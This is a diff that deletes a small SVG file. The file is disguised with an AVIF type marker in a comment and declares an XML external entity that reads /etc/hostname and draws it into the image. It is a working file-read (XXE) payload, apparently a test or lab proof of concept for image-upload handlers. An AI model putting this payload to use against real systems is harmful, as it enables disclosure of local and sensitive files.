@@ -1,4 +1,0 @@
-<!--ftypavif--><!DOCTYPE svg [
-<!ENTITY e SYSTEM "file:///etc/hostname">
-]>
-<svg xmlns="http://www.w3.org/2000/svg" width="1080" height="120"><rect x="0" y="0" width="1080" height="120" fill="#ffffff"/><text x="8" y="80" font-family="DejaVu Sans Mono, monospace" font-size="60" fill="#000000">&e;</text></svg>
